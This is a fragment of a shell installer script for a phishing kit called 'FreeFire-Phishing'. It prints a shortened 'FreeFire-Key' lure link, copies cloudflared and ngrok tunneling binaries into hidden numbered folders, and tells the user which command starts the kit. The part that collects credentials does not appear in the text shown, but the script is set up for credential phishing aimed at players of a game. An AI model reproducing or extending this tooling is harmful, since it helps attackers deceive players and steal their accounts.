...
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://tinyurl.com/FreeFire-Key  "
echo ""
echo ""
...
cp -R cloudflared-linux-386 ngrok .SUMAN/7/
cp -R cloudflared-linux-386 ngrok .SUMAN/8/
cp -R cloudflared-linux-386 ngrok .SUMAN/9/
cp -R cloudflared-linux-386 ngrok .SUMAN/0/
...
echo
echo
echo -e "\e[92m[+] New type this command to start :\e[93m FreeFire-Phishing \e[m "
echo
fi
